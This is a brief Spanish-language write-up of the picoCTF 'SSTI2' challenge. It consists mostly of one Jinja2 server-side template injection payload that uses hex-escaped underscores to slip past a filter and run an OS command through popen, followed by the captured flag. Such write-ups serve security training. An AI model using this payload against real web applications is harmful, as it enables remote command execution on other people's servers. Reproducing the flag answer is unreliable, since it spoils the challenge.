#### Description

[](https://github.com/Tiitania/hacking-nodes-2025/blob/main/PicoCTF/Examen%20P.1/SSTI2.md#description)

I made a cool website where you can announce whatever you want! Try it out!

Additional details will be available after launching your challenge instance.

#### Hints 

[](https://github.com/Tiitania/hacking-nodes-2025/blob/main/PicoCTF/Examen%20P.1/SSTI2.md#hints)

- Server Side Template Injection

## Solución

[](https://github.com/Tiitania/hacking-nodes-2025/blob/main/PicoCTF/Examen%20P.1/SSTI2.md#soluci%C3%B3n)

```
insertamos la sig inyeccion sacada de la pagina: 


{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}


y ya nos da la bandera

# picoCTF{sst1_f1lt3r_byp4ss_8b534b82}
```